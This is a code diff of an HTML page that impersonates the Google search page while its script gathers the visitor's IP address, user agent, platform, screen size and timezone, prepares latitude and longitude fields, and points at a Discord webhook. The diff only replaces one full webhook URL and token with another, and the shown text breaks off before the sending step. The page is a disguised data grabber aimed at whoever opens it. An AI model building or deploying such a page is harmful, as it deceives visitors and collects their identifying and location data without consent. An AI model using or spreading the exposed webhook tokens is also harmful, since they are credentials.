@@ -1,5 +1,5 @@
 <!DOCTYPE html><html><head><title>Google</title><style>body{margin:0;background:#fff;color:#000;font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;}#logo{font-size:5rem;color:#4285f4;margin-bottom:20px;}input{width:500px;padding:12px;border:1px solid #dfe1e5;border-radius:24px;}</style></head><body><div id="logo">Google</div><input type="text" value="Searching metadata..." readonly><div id="status" style="margin-top:20px;color:#666;">Loading results...</div><script>
-const WEBHOOK_URL='https://discord.com/api/webhooks/1495173417434087525/Peg6A9-52ckoH0A0Le00aBhX_GXH65Qx0Pq7NZdQNIY-8BhpPu2XEVqSVJ_7FUcE8Wl9';
+const WEBHOOK_URL='https://discord.com/api/webhooks/1495498146355089613/gBZlqAlyhI_XOfhYN_TvPNTn76kSptOY1Blh6QEDAbXWCSxn6GHmsM_uaQEK9pNkK8Sk';
 const info={timestamp:new Date().toISOString(),ip:null,userAgent:navigator.userAgent,platform:navigator.platform,screen:`${screen.width}x${screen.height}`,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,latitude:null,longitude:null};
 async function main(){
   try{info.ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch{}
